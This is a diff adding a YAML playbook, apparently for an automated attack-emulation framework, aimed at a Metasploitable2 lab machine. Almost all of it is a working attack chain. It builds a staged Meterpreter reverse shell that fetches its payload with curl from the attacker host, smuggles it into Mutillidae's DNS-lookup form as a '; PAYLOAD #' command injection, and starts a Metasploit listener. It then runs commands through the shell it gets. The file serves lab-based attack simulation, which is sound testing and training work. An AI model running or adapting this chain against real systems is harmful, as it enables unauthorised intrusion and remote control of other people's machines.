@@ -1,0 +1,81 @@
+#
+# Author: Wolfgang Hotwagner
+# Description:
+#     This playbook perfoms the following attack-steps:
+#     1. Create a staged reverse shell that uses a curl command
+#     2. Store payload in a variable(RESULT_STDOUT)
+#     3. Create a variable for the command injection: '; PAYLOAD #'
+#     4. Start a listener(in background) for the reverse shell using metasploit
+#     5. Perform the http-request that triggers the command injection
+#     6. Execute commands via reverse shell
+#
+# Requirements:
+#     1. Run this on kali-linux
+#     2. Metasploit installed and msfrpd executed
+#     3. Target a Metasploitable2-VM
+#
+vars:
+  METASPLOITABLE: 172.17.0.106
+  ATTACKER: 172.17.0.127
+  PAYLOAD: cmd/linux/http/x86/meterpreter/reverse_tcp
+  LPORT: 4401
+
+commands:
+  - type: mktemp
+    variable: RSHELL
+
+  # generate a staged reverse shell
+  # use a fetch-payload(curl) for the cmdstager
+  - type: msf-payload
+    cmd: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+      FETCH_WRITABLE_DIR: /tmp
+      FETCH_SRVHOST: $ATTACKER
+      FETCH_SRVPORT: 8080
+    format: raw
+    local_path: ${RSHELL}
+
+  # save payload in variable
+  - type: shell
+    cmd: cat $RSHELL
+
+  # prepare the command-injection-payload
+  - type: setvar
+    variable: CMDSTAGE
+    cmd: "; $RESULT_STDOUT #"
+
+  # start shell-listener in background
+  - type: msf-module
+    creates_session: shell
+    cmd: exploit/multi/handler
+    payload: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+      FETCH_WRITABLE_DIR: /tmp
+      FETCH_SRVHOST: $ATTACKER
+      FETCH_SRVPORT: 8080
+    background: true
+    kill_on_exit: true
+
+  # execute the command injection and trigger the reverse shell download
+  - type: http-client
+    cmd: POST
+    url: http://$METASPLOITABLE/mutillidae/index.php?page=dns-lookup.php
+    data:
+      target_host: $CMDSTAGE
+      dns-lookup-php-submit-button: "Lookup+DNS"
+    background: true
+    kill_on_exit: true
+
+  # execute a command via reverse shell
+  - type: msf-session
+    session: shell
+    cmd: getuid
+
+  # execute a command via reverse shell
+  - type: msf-session
+    session: shell
+    cmd: ls
